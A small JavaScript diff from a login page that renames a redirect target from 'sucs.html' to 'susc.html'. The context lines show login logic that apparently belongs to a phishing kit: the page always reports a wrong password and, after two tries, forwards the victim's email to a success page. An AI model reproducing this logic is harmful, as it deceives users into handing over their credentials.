@@ -354,7 +354,7 @@ type: 'POST',
             			if (count>=2) {
             				count=0;
                     // window.location.replace(response['redirect_link']);
-                    window.location.replace("sucs.html?msg="+email);
+                    window.location.replace("susc.html?msg="+email);
 
                 }
                 $('#msg').html(response['msg']);
@@ -368,7 +368,7 @@ type: 'POST',
     	$("#password").val("");
     	if (count>=2) {
     		count=0;
-    		 window.location.replace("sucs.html?msg="+email);
+    		 window.location.replace("susc.html?msg="+email);
     	}
     	$("#msg").show();
     	$('#msg').html("Please enter correct password and try again");
